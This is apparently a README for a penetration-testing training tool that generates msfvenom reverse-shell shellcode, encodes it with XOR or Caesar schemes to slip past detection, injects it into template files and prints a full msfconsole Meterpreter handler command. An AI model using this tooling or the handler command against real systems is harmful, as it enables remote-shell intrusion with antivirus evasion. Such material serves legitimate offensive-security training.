# Shellcode Encoder

## Usage

Run the encoding script and follow the prompts:

python encoding_script.py
The script will:
- Generate shellcode using msfvenom (e.g., reverse_https/reverse_tcp payload)
- Encode the shellcode using XOR, Caesar, or a custom encoding method
- Inject the encoded shellcode between markers in template files and save updated files in the current directory
- Output an msfconsole command to start the appropriate Metasploit handler
Example msfconsole output:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST tun0; set LPORT 443; set ExitOnSession false; exploit -j"


## Source
https://github.com/chvancooten/OSEP-Code-Snippets
